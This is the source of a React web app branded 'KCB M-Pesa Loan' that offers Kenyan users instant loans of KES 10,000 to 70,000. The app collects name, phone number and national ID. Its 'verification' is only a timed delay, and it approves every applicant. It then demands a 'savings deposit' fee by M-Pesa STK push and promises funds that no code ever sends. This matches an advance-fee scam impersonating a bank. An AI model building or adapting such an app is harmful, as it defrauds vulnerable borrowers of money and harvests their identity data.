/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useRef, useEffect } from 'react';

interface Loan {
  amount: number;
  fee: number;
}

interface Applicant {
  fullName: string;
  phone: string;
  idNumber: string;
  loanType: string;
}

const LOANS: Loan[] = [
  { amount: 10000, fee: 100 },
  { amount: 12500, fee: 130 },
  { amount: 16000, fee: 180 },
  { amount: 21000, fee: 200 },
  { amount: 25500, fee: 220 },
  { amount: 30000, fee: 350 },
  { amount: 35000, fee: 420 },
  { amount: 40000, fee: 540 },
  { amount: 45000, fee: 680 },
  { amount: 50000, fee: 940 },
  { amount: 60000, fee: 1550 },
  { amount: 70000, fee: 2000 },
];

function formatCurrency(amount: number): string {
  return `KES ${Number(amount).toLocaleString()}`;
}

function formatKsh(amount: number): string {
  return `Ksh ${Number(amount).toLocaleString()}`;
}

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function normalizePhone(input: string): string {
  let phone = String(input || '')
    .replace(/\s+/g, '')
    .replace(/^\+/, '')
    .replace(/\D/g, '');
  if (phone.startsWith('0') && phone.length === 10) {
    phone = `254${phone.slice(1)}`;
  } else if ((phone.startsWith('7') || phone.startsWith('1')) && phone.length === 9) {
    phone = `254${phone}`;
  }
  if (!/^254(7|1)\d{8}$/.test(phone)) {
    throw new Error('Enter a valid Safaricom number, e.g. 0712345678.');
  }
  return phone;
}

export default function App() {
  const [currentScreen, setCurrentScreen] = useState<'home' | 'apply'>('home');
  const [currentPanel, setCurrentPanel] = useState<
    'details' | 'verifying' | 'approved' | 'withdraw' | 'processing' | 'success'
  >('details');
  const [selectedLoan, setSelectedLoan] = useState<Loan | null>(null);
  const [applicant, setApplicant] = useState<Applicant | null>(null);

  // Form states
  const [fullName, setFullName] = useState('');
  const [phone, setPhone] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [loanType, setLoanType] = useState('');
  const [confirmPhone, setConfirmPhone] = useState('');

  // Loading & Reference states
  const [isSubmittingDetails, setIsSubmittingDetails] = useState(false);
  const [isInitiatingPayment, setIsInitiatingPayment] = useState(false);
  const [reference, setReference] = useState('');

  // Toast state
  const [toast, setToast] = useState<{
    active: boolean;
    title: string;
    message: string;
    isError: boolean;
  }>({
    active: false,
    title: '',
    message: '',
    isError: false,
  });

  const toastTimerRef = useRef<NodeJS.Timeout | null>(null);
  const pollTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    return () => {
      if (toastTimerRef.current) clearTimeout(toastTimerRef.current);
      if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    };
  }, []);

  const showToast = (title: string, message: string, type: 'default' | 'error' = 'default') => {
    if (toastTimerRef.current) {
      clearTimeout(toastTimerRef.current);
    }
    setToast({
      active: true,
      title,
      message,
      isError: type === 'error',
    });
    toastTimerRef.current = setTimeout(() => {
      setToast((prev) => ({ ...prev, active: false }));
    }, 4200);
  };

  const showHome = () => {
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
    setSelectedLoan(null);
    setApplicant(null);
    setFullName('');
    setPhone('');
    setIdNumber('');
    setLoanType('');
    setConfirmPhone('');
    setReference('');
    setIsSubmittingDetails(false);
    setIsInitiatingPayment(false);
    setCurrentScreen('home');
    setCurrentPanel('details');
  };

  const showApplication = (loan: Loan) => {
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
    setSelectedLoan(loan);
    setApplicant(null);
    setFullName('');
    setPhone('');
    setIdNumber('');
    setLoanType('');
    setConfirmPhone('');
    setReference('');
    setIsSubmittingDetails(false);
    setIsInitiatingPayment(false);
    setCurrentScreen('apply');
    setCurrentPanel('details');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleDetailsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanFullName = fullName.trim();
    const cleanPhone = phone.trim();
    const cleanIdNumber = idNumber.trim();
    const cleanLoanType = loanType.trim();

    if (!cleanFullName || !cleanPhone || !cleanIdNumber || !cleanLoanType) {
      showToast('Missing fields', 'Please fill in all required fields.', 'error');
      return;
    }

    if (!/^\d{7,10}$/.test(cleanIdNumber)) {
      showToast('Invalid ID Number', 'ID Number must be 7 to 10 digits.', 'error');
      return;
    }

    try {
      normalizePhone(cleanPhone);
    } catch (err: unknown) {
      const error = err as Error;
      showToast('Invalid phone number', error.message, 'error');
      return;
    }

    const appData: Applicant = {
      fullName: cleanFullName,
      phone: cleanPhone,
      idNumber: cleanIdNumber,
      loanType: cleanLoanType,
    };
    setApplicant(appData);
    setIsSubmittingDetails(true);
    setCurrentPanel('verifying');

    await delay(1500);

    setIsSubmittingDetails(false);
    setCurrentPanel('approved');
  };

  const handleProceedToWithdraw = () => {
    setConfirmPhone(applicant?.phone || '');
    setCurrentPanel('withdraw');
  };

  const handleInitiatePayment = async () => {
    let phoneToUse = confirmPhone.trim();
    try {
      phoneToUse = normalizePhone(phoneToUse);
    } catch (err: unknown) {
      const error = err as Error;
      showToast('Invalid phone number', error.message, 'error');
      return;
    }

    if (!selectedLoan) return;

    setIsInitiatingPayment(true);

    try {
      const response = await fetch('/api/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: selectedLoan.fee,
          phone: phoneToUse,
        }),
      });

      const result = await response.json();

      if (result.success) {
        setReference(result.reference);
        setCurrentPanel('processing');

        let pollCount = 0;
        const maxPolls = 20;

        if (pollTimerRef.current) {
          clearInterval(pollTimerRef.current);
        }

        pollTimerRef.current = setInterval(async () => {
          pollCount++;
          if (pollCount >= maxPolls) {
            if (pollTimerRef.current) clearInterval(pollTimerRef.current);
            showToast(
              'Timeout',
              'Payment verification timed out. Please check your messages and try again later.',
              'error'
            );
            setCurrentPanel('withdraw');
            return;
          }

          try {
            const statusRes = await fetch(`/api/status/${encodeURIComponent(result.reference)}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'completed') {
              if (pollTimerRef.current) clearInterval(pollTimerRef.current);
              setCurrentPanel('success');
            } else if (statusData.status === 'failed') {
              if (pollTimerRef.current) clearInterval(pollTimerRef.current);
              showToast('Payment Failed', 'Transaction failed. Please try again.', 'error');
              setCurrentPanel('withdraw');
            }
          } catch (err) {
            console.error('Error checking status:', err);
          }
        }, 3000);
      } else {
        showToast('Payment Failed', result.error || 'Transaction failed. Please try again.', 'error');
      }
    } catch {
      showToast('Payment Error', 'Network error. Please try again.', 'error');
    } finally {
      setIsInitiatingPayment(false);
    }
  };

  return (
    <>
      {/* Home Screen */}
      <main id="home-screen" className={`screen ${currentScreen !== 'home' ? 'hidden' : ''}`}>
        <header className="hero">
          <div className="hero-inner">
            <h1>KCB M-Pesa Loan</h1>
            <p>Quick KCB M-Pesa loans with simple fees. Choose your amount, pay the fee, and get funded.</p>
          </div>
        </header>

        <section className="feature-band" aria-label="Loan benefits">
          <div className="feature-grid">
            <article className="feature-card">
              <span className="feature-icon" aria-hidden="true">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2"></circle>
                  <path
                    d="M12 7v5l3 2"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </span>
              <div>
                <h3>Fast Approval</h3>
                <p>Get your loan approved within 24 hours</p>
              </div>
            </article>

            <article className="feature-card">
              <span className="feature-icon" aria-hidden="true">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <path
                    d="M12 3 5 6v5c0 4.5 2.9 8.4 7 10 4.1-1.6 7-5.5 7-10V6l-7-3Z"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinejoin="round"
                  ></path>
                  <path
                    d="m9 12 2 2 4-5"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </span>
              <div>
                <h3>Secure Process</h3>
                <p>Your data is protected with encryption</p>
              </div>
            </article>

            <article className="feature-card">
              <span className="feature-icon" aria-hidden="true">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <rect x="3" y="6" width="18" height="12" rx="2" stroke="currentColor" strokeWidth="2"></rect>
                  <path
                    d="M7 10h5M7 14h3M17 14h.01"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                  ></path>
                </svg>
              </span>
              <div>
                <h3>Low Fees</h3>
                <p>Transparent fees with no hidden charges</p>
              </div>
            </article>
          </div>
        </section>

        <section className="loan-section">
          <h2>Choose Your Loan</h2>
          <p>Select a loan amount in KES. Enjoy quick withdrawal on every loan.</p>
          <div id="loan-grid" className="loan-grid" aria-label="Loan options">
            {LOANS.map((loan, index) => (
              <article
                key={loan.amount}
                className="loan-card"
                data-index={index}
                tabIndex={0}
                role="button"
                aria-label={`Select ${formatCurrency(loan.amount)} loan`}
                onClick={() => showApplication(loan)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    showApplication(loan);
                  }
                }}
              >
                <p className="loan-label">Loan Amount</p>
                <p className="loan-amount">{formatCurrency(loan.amount)}</p>
                <div className="mpesa-badge" aria-hidden="true">
                  M-Pesa
                </div>
                <button className="btn btn-outline" type="button">
                  Select Loan
                </button>
              </article>
            ))}
          </div>
        </section>

        <footer className="site-footer">
          &copy; 2026 KCB M-Pesa Loan. Loans disbursed in Kenyan Shillings (KES).
        </footer>
      </main>

      {/* Application Screen */}
      <main id="apply-screen" className={`screen ${currentScreen !== 'apply' ? 'hidden' : ''}`}>
        <header className="apply-header">
          <div className="apply-header-inner">
            <button id="back-to-loans" className="back-button" type="button" onClick={showHome}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <path
                  d="M19 12H5m7-7-7 7 7 7"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                ></path>
              </svg>
              Back to Loans
            </button>
            <h1 id="apply-title">
              {selectedLoan ? `Apply for ${formatCurrency(selectedLoan.amount)} Loan` : 'Apply for KES 0 Loan'}
            </h1>
            <p id="apply-subtitle" className={currentPanel === 'details' ? 'hidden' : ''}>
              Savings Required: {selectedLoan ? formatCurrency(selectedLoan.fee) : 'KES 0'}
            </p>
          </div>
        </header>

        <section className="apply-main">
          {/* Details Panel */}
          <div id="details-panel" className={`panel ${currentPanel !== 'details' ? 'hidden' : ''}`}>
            <div className="panel-head">
              <h2 className="panel-title">Personal Details</h2>
            </div>
            <div className="panel-body">
              <form id="details-form" className="form-stack" onSubmit={handleDetailsSubmit}>
                <div className="field">
                  <label htmlFor="fullName">Full Name *</label>
                  <input
                    id="fullName"
                    name="fullName"
                    autoComplete="name"
                    placeholder="e.g. Mulenga Banda"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                  />
                </div>
                <div className="field">
                  <label htmlFor="phone">Phone Number *</label>
                  <input
                    id="phone"
                    name="phone"
                    inputMode="tel"
                    autoComplete="tel"
                    placeholder="e.g. Safaricom 0712345678"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                  />
                </div>
                <div className="field">
                  <label htmlFor="idNumber">ID Number *</label>
                  <input
                    id="idNumber"
                    name="idNumber"
                    inputMode="numeric"
                    autoComplete="off"
                    placeholder="e.g. 12345678"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                  />
                </div>
                <div className="field">
                  <label htmlFor="loanType">Type of Loan *</label>
                  <select
                    id="loanType"
                    name="loanType"
                    value={loanType}
                    onChange={(e) => setLoanType(e.target.value)}
                  >
                    <option value="">Select loan type</option>
                    <option value="school_fees">School Fees</option>
                    <option value="emergency">Emergency</option>
                    <option value="business">Business</option>
                    <option value="leisure">Leisure</option>
                    <option value="real_estate">Real Estate</option>
                  </select>
                </div>
                <button
                  id="submit-details"
                  className="btn btn-primary"
                  type="submit"
                  disabled={isSubmittingDetails}
                >
                  {isSubmittingDetails ? (
                    <>
                      <span className="spinner" aria-hidden="true"></span> Processing...
                    </>
                  ) : (
                    'Submit Application'
                  )}
                </button>
              </form>
            </div>
          </div>

          {/* Verifying Panel */}
          <div id="verifying-panel" className={`panel ${currentPanel !== 'verifying' ? 'hidden' : ''}`}>
            <div className="status-card">
              <span className="status-icon" aria-hidden="true">
                <span className="spinner"></span>
              </span>
              <h2>Verifying</h2>
              <p>Please wait while we verify your details and selected loan.</p>
            </div>
          </div>

          {/* Approved Panel */}
          <div id="approved-panel" className={`panel ${currentPanel !== 'approved' ? 'hidden' : ''}`}>
            <div className="status-card">
              <span className="status-icon" aria-hidden="true">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
                  <path
                    d="m5 12 5 5L20 7"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </span>
              <div className="state-stack">
                <div>
                  <h2>Congratulations!</h2>
                  <p>
                    Your loan of{' '}
                    <strong id="approved-amount">
                      {selectedLoan ? formatKsh(selectedLoan.amount) : 'Ksh 0'}
                    </strong>{' '}
                    has been processed successfully.
                  </p>
                  <p>Please proceed to the withdrawal stage to receive your funds.</p>
                </div>
                <button
                  id="proceed-withdraw"
                  className="btn btn-primary"
                  type="button"
                  onClick={handleProceedToWithdraw}
                >
                  Proceed to Withdraw
                </button>
              </div>
            </div>
          </div>

          {/* Withdraw Panel */}
          <div id="withdraw-panel" className={`panel ${currentPanel !== 'withdraw' ? 'hidden' : ''}`}>
            <div className="panel-head">
              <h2 className="panel-title">Complete Your Savings Deposit</h2>
            </div>
            <div className="panel-body state-stack">
              <div className="summary-box">
                <div className="summary-row">
                  <span>Loan Amount</span>
                  <strong id="summary-loan">
                    {selectedLoan ? formatCurrency(selectedLoan.amount) : 'KES 0'}
                  </strong>
                </div>
                <div className="summary-row">
                  <span>Savings Required</span>
                  <strong id="summary-fee" className="text-primary">
                    {selectedLoan ? formatCurrency(selectedLoan.fee) : 'KES 0'}
                  </strong>
                </div>
              </div>
              <p className="muted-note">
                A savings deposit of{' '}
                <strong id="withdraw-fee-text">
                  {selectedLoan ? formatCurrency(selectedLoan.fee) : 'KES 0'}
                </strong>{' '}
                is required in order to acquire this loan. Please complete the deposit via M-Pesa to release
                your funds.
              </p>
              <div className="field">
                <label htmlFor="confirmPhone">M-Pesa Phone Number</label>
                <input
                  id="confirmPhone"
                  name="confirmPhone"
                  inputMode="tel"
                  autoComplete="tel"
                  value={confirmPhone}
                  onChange={(e) => setConfirmPhone(e.target.value)}
                />
              </div>
              <button
                id="initiate-payment"
                className="btn btn-primary"
                type="button"
                disabled={isInitiatingPayment}
                onClick={handleInitiatePayment}
              >
                {isInitiatingPayment ? (
                  <>
                    <span className="spinner" aria-hidden="true"></span> Processing...
                  </>
                ) : (
                  'Initiate Payment'
                )}
              </button>
            </div>
          </div>

          {/* Processing Panel */}
          <div id="processing-panel" className={`panel ${currentPanel !== 'processing' ? 'hidden' : ''}`}>
            <div className="status-card">
              <span className="status-icon" aria-hidden="true">
                <span className="spinner"></span>
              </span>
              <div className="state-stack">
                <div>
                  <h2>STK Push Initiated</h2>
                  <p>Check your phone to complete the transaction.</p>
                  <p id="processing-message">Please enter your KCB - M-Pesa PIN when prompted.</p>
                </div>
                {reference && (
                  <div className="notice" id="processing-reference">
                    {reference}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Success Panel */}
          <div id="success-panel" className={`panel ${currentPanel !== 'success' ? 'hidden' : ''}`}>
            <div className="status-card">
              <span className="status-icon success" aria-hidden="true">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
                  <path
                    d="m5 12 5 5L20 7"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </span>
              <div className="state-stack">
                <div>
                  <h2>Payment Successful</h2>
                  <p>Your transaction was completed successfully.</p>
                  <p>
                    Your withdrawal of{' '}
                    <strong id="success-amount">
                      {selectedLoan ? formatCurrency(selectedLoan.amount) : 'KES 0'}
                    </strong>{' '}
                    is now being processed.
                  </p>
                </div>
                <div className="notice">Funds will be disbursed within 24 hours.</div>
                <button id="success-home" className="btn btn-outline" type="button" onClick={showHome}>
                  Back to Home
                </button>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Floating Toast Notification */}
      <div
        id="toast"
        className={`toast ${toast.active ? 'active' : ''} ${toast.isError ? 'error' : ''}`}
        role="status"
        aria-live="polite"
      >
        <div id="toast-title" className="toast-title">
          {toast.title}
        </div>
        <div id="toast-message" className="toast-message">
          {toast.message}
        </div>
      </div>
    </>
  );
}
